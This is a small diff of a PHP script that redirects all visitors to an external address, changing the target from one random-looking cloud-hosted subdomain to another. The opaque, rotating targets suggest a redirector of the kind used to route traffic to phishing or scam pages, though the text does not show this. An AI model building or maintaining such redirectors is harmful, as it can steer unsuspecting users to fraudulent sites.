@@ -1,5 +1,5 @@
 <?php
-$url = "https://dqwew2sd.z1.web.core.windows.net/";
+$url = "https://main.dr690aioyfpgs.amplifyapp.com/";
 header('Location: '.$url);
 die();
 ?>
